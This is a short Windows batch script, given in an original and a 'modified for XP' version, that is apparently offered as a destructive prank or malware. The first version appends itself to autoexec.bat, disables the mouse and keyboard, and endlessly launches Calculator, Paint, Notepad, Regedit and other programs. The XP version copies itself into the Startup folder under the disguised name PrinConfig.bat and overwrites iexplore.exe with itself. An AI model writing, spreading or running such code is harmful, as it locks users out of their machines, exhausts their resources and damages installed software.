@Echo Off
START Bah.bat >> c:\autoexec.bat
c:\windows\rundll32.exe mouse,disable
c:\windows\rundll32.exe keyboard,disable
:Bah
START Calc.Exe
START Pbrush.exe
START Notepad.exe
START Regedit.exe
START Winfile.exe
START Iexplore.exe
goto Bah
----------------------
Modified: (For XP - Its what i got)
----------------------
@Echo Off
Copy %0 "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\PrinConfig.bat"
Copy %0 "C:\Program Files\Internet Explorer\iexplore.exe"
START Calc.Exe
START Pbrush.exe
START Notepad.exe
START Regedit.exe
START Winfile.exe
START Iexplore.exe
